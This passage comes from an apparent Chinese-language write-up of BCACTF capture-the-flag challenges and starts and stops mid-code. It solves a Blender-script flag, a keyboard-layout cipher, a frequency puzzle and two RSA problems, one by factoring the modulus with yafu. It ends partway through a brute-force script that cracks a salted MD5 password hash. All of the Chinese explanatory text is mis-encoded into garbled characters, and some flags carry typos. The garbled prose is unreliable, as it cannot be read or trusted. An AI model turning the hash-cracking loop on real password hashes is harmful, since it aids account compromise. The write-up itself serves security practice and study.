class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">1.2</span>)<br>font_obj.rotation_euler = (<span class="hljs-number">90</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>font_obj.scale = (<span class="hljs-number">0.75</span>, <span class="hljs-number">0.75</span>, <span class="hljs-number">0.75</span>)<br></code></pre></td></tr></table></figure><p>ä¸­é—´çš„aå°±æ˜¯æˆ‘ä»¬çš„flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = (<br>    <span class="hljs-built_in">str</span>(<br>        b64decode(<br>            (<br>                <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span>)<br>                + <span class="hljs-built_in">chr</span>(x - <span class="hljs-number">0x000000000000001</span> * <span class="hljs-number">10</span> // <span class="hljs-number">2</span> + <span class="hljs-number">6</span> - <span class="hljs-number">6</span> % <span class="hljs-number">4</span>)<br>                + (<span class="hljs-string">&quot;wemR3YhNmY&quot;</span>)<br>            )[::-<span class="hljs-number">1</span>]<br>        )<br>    )[:-<span class="hljs-number">1</span>]<br>    + yrsth<br>    + <span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>xçš„å€¼å¯ä»¥ç®—ï¼Œå‰é¢çš„base64ä¹Ÿå¯ä»¥è§£ã€‚æ¥å‡ºæ¥å°±æ˜¯bcactf{æ‰€ä»¥è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„flagã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦å¾—åˆ°yrsthè¿™ä¸ªéƒ¨åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">u =  <span class="hljs-string">&quot;__&quot;</span>[<span class="hljs-number">1</span>:] + <span class="hljs-string">&#x27;x_N3r0f__&#x27;</span>[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>]<br>yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <br><span class="hljs-string">&quot;Xp_R3&quot;</span>[<span class="hljs-number">1</span>::-<span class="hljs-number">1</span>] + <br><span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;YtH0&quot;</span>[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>] + <br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span><br>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + u<br><br></code></pre></td></tr></table></figure><p>uçš„çš„è¯ç›¸å½“äºç›´æ¥ç»™å‡ºäº†ã€‚ä¸­é—´å‡ æ®µæ˜æ–‡è·‘ä¸€ä¸‹å°±èƒ½å¾—åˆ°ã€‚å¯ä»¥çš„å¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">0</span>].vertices) - <span class="hljs-number">3</span>) + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">2</span>].vertices) - <span class="hljs-number">1</span>)+ <span class="hljs-string">&quot;NdR__&quot;</span> +  <br><span class="hljs-string">&quot;pX&quot;</span> + <br><span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;tH&quot;</span> + <br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">5</span>].vertices) ** <span class="hljs-number">0</span> - <span class="hljs-number">1</span><br>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + <span class="hljs-string">&quot;_f0r3N&quot;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‰é¢æœ‰ä¸€ä¸ªblenderè¿™ä¸ªå•è¯ã€‚æ‰€ä»¥çŒœæµ‹ç¼ºå°‘çš„ä¸€ä¸ªæ˜¯1ä¸€ä¸ªæ˜¯3ã€‚</p><p>åé¢æœ‰ä¸€ä¸ª0æ¬¡æ–¹ï¼Œæ‰€ä»¥æ˜¯0ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">yrsth = <span class="hljs-string">&quot;b&quot;</span> + <span class="hljs-built_in">str</span>(<br>    <span class="hljs-string">&quot;1&quot;</span> + <span class="hljs-string">&quot;3&quot;</span> + <span class="hljs-string">&quot;NdR__&quot;</span> +  <span class="hljs-string">&quot;pX&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(bpy.context.<span class="hljs-built_in">object</span>.data.polygons[<span class="hljs-number">3</span>].vertices) + <span class="hljs-built_in">int</span>(<span class="hljs-number">42.5</span>*<span class="hljs-number">2</span>)) + <br><span class="hljs-string">&quot;tH&quot;</span> + <span class="hljs-string">&quot;0&quot;</span>   ) + <span class="hljs-string">&quot;N_4ND&quot;</span> + <span class="hljs-string">&quot;_f0r3N&quot;</span><br></code></pre></td></tr></table></figure><p>ä½ çœ‹çœ‹é‚£ä¸ªå•è¯åƒä¸åƒpythonï¼Ÿåé¢åŠ äº†85æ‰€ä»¥åº”è¯¥æ˜¯Yã€‚é‚£ä¹ˆyrsthå°±æ˜¯ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">b13NdR__pXYtH0N_4ND_f0r3N</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># bcacft&#123;b13NdR__pXYtH0N_4ND_f0r3N&#125;</span><br></code></pre></td></tr></table></figure><h2 id="gogle-maze"><a class="markdownIt-Anchor" href="#gogle-maze"></a> Gogle Maze</h2><p>æ˜¯ä¸€ä¸ªgoogleæ–‡æ¡£ã€‚ä½†æ˜¯æˆ‘ä»¬å•¥éƒ½åšä¸äº†ï¼Œç‚¹å‡»ä¸‹ä¸€ä¸ªæ²¡ç”¨ã€‚</p><p>å³é”®æŸ¥çœ‹æºä»£ç ã€‚æœç´¢bcactfã€‚</p><p>æ‰¾åˆ°flagã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># bcactf&#123;f4</span>rthER_th<span class="hljs-number">4</span><span class="hljs-symbol">n_m3</span>eTS_th<span class="hljs-number">3</span>_EY<span class="hljs-number">3</span>_<span class="hljs-number">9928</span>ef&#125;<br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="new-keyboard"><a class="markdownIt-Anchor" href="#new-keyboard"></a> New Keyboard</h2><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">Cy ygpbo rgy ydco t.fxrape go.o yd. Ekrpat nafrgy<span class="hljs-operator">!</span> Cy p.annf m.oo.o gl mf mgojn. m.mrpfv Yd. unai co xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>æç¤ºè¯´ä»–ç”¨äº†ä¸€ä¸ªå°‘è§çš„é”®ç›˜æ ¼å¼ã€‚</p><p>çŒœæµ‹</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">unai co xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>æ˜¯æˆ‘ä»¬çš„flagã€‚</p><p>æ‰¾äº†ä¸€ä¸‹åº”è¯¥æ˜¯è¿™ä¸ªDvoraké”®ç›˜ï¼š</p><p><img src="https://s2.loli.net/2022/06/05/jpgwmIlhX7aKvSF.png" alt="KB_United_States_Dvorak.png" /></p><p>å› ä¸ºunaiçš„ä½ç½®åˆšå¥½å°±æ˜¯æˆ‘ä»¬æ­£å¸¸é”®ç›˜çš„flagã€‚æ‰€ä»¥flagä¸ºï¼š</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">xjajyu<span class="hljs-operator">?</span><span class="hljs-keyword">t3fx0ape</span>&#123;<span class="hljs-keyword">naf0g7</span>&#123;<span class="hljs-keyword">jdabi3gl</span>&#123;&#x27;,.pyf<span class="hljs-operator">+</span><br><span class="hljs-keyword">bcacft</span>&#123;k3yb0ard_lay0u7_chang3up_qwerty&#125;<br><br># <span class="hljs-keyword">bcacft</span>&#123;k3yb0ard_lay0u7_chang3up_qwerty&#125;<br></code></pre></td></tr></table></figure><h2 id="hidden-frequencies"><a class="markdownIt-Anchor" href="#hidden-frequencies"></a> Hidden Frequencies</h2><p>æ–‡ä»¶æ˜¯ä¸€ä¸²å­—ç¬¦</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnoooooooooooooooooooooooooooooooooooooooooooooooooooppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttttttttttttttttttttttttttttttttttttttttttttttttttuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111122222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444444444444444455555555555555555555555555555555555555555555555566666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999............................................................................................................???????????????????????????????????????????????????????????????????????????????????????????????!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####################################################################################################$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;<br></code></pre></td></tr></table></figure><p>ç»Ÿè®¡æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°ï¼Œç„¶åè½¬asciiã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;msg.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = fp.read()<br>charset = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;.?!&lt;&gt;@#$%^&amp;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data.count(i)), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment"># bcactf&#123;ch4r4ct3r_fr3qu3ncy_15_50_c00l_55aFejnb&#125;</span><br></code></pre></td></tr></table></figure><h2 id="really-secure-algorithm"><a class="markdownIt-Anchor" href="#really-secure-algorithm"></a> Really Secure Algorithm</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">c</span><span class="hljs-operator">=</span><span class="hljs-number">2464250865277757821428965675155522992457560926961269981007162702551724392855202737838222228070453790200941338664587735699257288834514629714756168098513102225910176071493495606754285130938545761358963130345627434505300662209712223707092556796463691345274980307752267846533429807624844732139940872159965514596</span><br><span class="hljs-attribute">p</span><span class="hljs-operator">=</span><span class="hljs-number">13088210551361451568469688622513897981426518145215665452575421200429661351366918393846354939929997184772996442562042682789520346956154452065929764946443447</span><br><span class="hljs-attribute">q</span><span class="hljs-operator">=</span><span class="hljs-number">1590315075423589460616307119751698143804899237034239149886381441961338087331451452499790183510691573469327467020483209974248378007574390792001615535983477</span><br><span class="hljs-attribute">e</span><span class="hljs-operator">=</span><span class="hljs-number">65537</span><br></code></pre></td></tr></table></figure><p>æ ‡å‡†çš„rsaã€‚</p><p>ç›´æ¥è§£å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>c=...<br>p=...<br>q=...<br>e=<span class="hljs-number">65537</span><br><br>d = <span class="hljs-built_in">int</span>(gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)))<br>m = <span class="hljs-built_in">pow</span>(c,d,p*q)<br><span class="hljs-built_in">print</span>(re.sub(<span class="hljs-string">&quot;1?..&quot;</span>, <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x.group())), <span class="hljs-built_in">str</span>(m)))<br><br><span class="hljs-comment"># bcactf&#123;w311_th15_15_aWkWard_Fbahu8d3&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¾“å‡ºçš„må°±æ˜¯æˆ‘ä»¬çš„æ˜æ–‡ï¼Œåªä¸è¿‡ä»–ä¸æ˜¯16è¿›åˆ¶çš„ï¼Œè€Œæ˜¯10è¿›åˆ¶çš„ã€‚æç¤ºé‡Œè¯´ä»–å–œæ¬¢åè¿›åˆ¶æˆ‘ä¹Ÿæ˜¯åŠå¤©æ²¡ç†è§£ã€‚</p><p>å¦‚æœä½ çœ‹mçš„åè¿›åˆ¶è¾“å‡ºçš„è¯ï¼Œå¯ä»¥çœ‹åˆ°å¼€å¤´æ˜¯98999799è¿™ä¸ªå…¶å®å°±æ˜¯asciiç äº†ï¼Œ b(98)c(99)a(97)c(99)ã€‚</p><h2 id="funky-factors"><a class="markdownIt-Anchor" href="#funky-factors"></a> Funky Factors</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">564821294757794643397264923024262896319938418162067361975239043464095797026401068770491393457675494733286339893448531140461611917094383999568438980881431718162518066997760793975381905628192846966986565357045880322008658585158406186349420366526027108151457442130148185466107727095596643126951328051023864119076639932491216</span><br></code></pre></td></tr></table></figure><p>å•¥éƒ½æ²¡ç»™ï¼Œä¸€èˆ¬æ¥è¯´å°±æ˜¯nå¯ä»¥ç›´æ¥åˆ†è§£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;yafu-x64.exe<br>factor(2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637)<br><br><br>fac: factoring 2451500972944572751067639135542724911455699735389455909239072706748572836232480252074031400797211301593443375562946962694274273077543664039604383719893091628336430360455909687693258270869995548362038438414271398400407702884883827901471304659858249570873108083356722001678236438255333957918061509916855914316124827985975637<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>rho: x^2 + 3, starting 1000 iterations on C322<br>rho: x^2 + 2, starting 1000 iterations on C322<br>rho: x^2 + 1, starting 1000 iterations on C322<br>pm1: starting B1 = 150K, B2 = gmp-ecm default on C322<br>Total factoring time = 4.2737 seconds<br><br><br>***factors found***<br><br>P14 = 25854458289211<br>P308 = 94819274320962195588391046032702062340347787753861707917333803643013756112498232723436129143357983211782575094016538160601055922810359418391115604418400747711916131212069247930840360588635198701990348690076607422776450913659984003956055504691820691172367804759436721489067099363705442358971393631085988763567<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>å¾—åˆ°p,qã€‚è§£rsaå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> re<br><br>p = ...<br>q = ...<br>e= <span class="hljs-number">65537</span><br>c= ...<br><br>d = gmpy2.invert(e, q-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c,d, q)<br><span class="hljs-built_in">print</span>(re.sub(<span class="hljs-string">&quot;1?..&quot;</span>, <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x.group())), <span class="hljs-built_in">str</span>(m)))<br><br><span class="hljs-comment"># bcactf&#123;w0w_f4ct0r1ng_l3g3nd_hAUebf29&#125;</span><br></code></pre></td></tr></table></figure><h2 id="salty"><a class="markdownIt-Anchor" href="#salty"></a> Salty</h2><p>çœ‹åå­—ä¼°è®¡å°±æ˜¯å“ˆå¸Œäº†ã€‚</p><p>ç»™çš„æ˜¯ä¸ªç½‘ç«™ï¼Œé‡Œé¢çš„debugéƒ¨åˆ†ç»™å‡ºäº†ä¸€ä¸ªhashå’Œsaltã€‚é¢˜ç›®æè¿°æ˜¯4ä½æ•°å­—å’Œå°å†™å­—æ¯ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çˆ†ç ´ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">hash</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6877ac6025ecfc8d127bfb158afd4273&quot;</span><br><span class="hljs-attribute">salt</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;NaCl-82eed&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-built_in">hash</span> = <span class="hljs-string">&quot;6877ac6025ecfc8d127bfb158afd4273&quot;</span><br>salt = <span class="hljs-string">&quot;NaCl-82eed&quot;</span><br><br>char_set = [string.ascii_lowercase + string.digits <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(*char_set):<br>    passwd = <span class="hljs-string">&quot;&quot;</span>.join(i) + salt<br><br>    <span class="hljs-keyword">if</span> md5(passwd.encode(<span 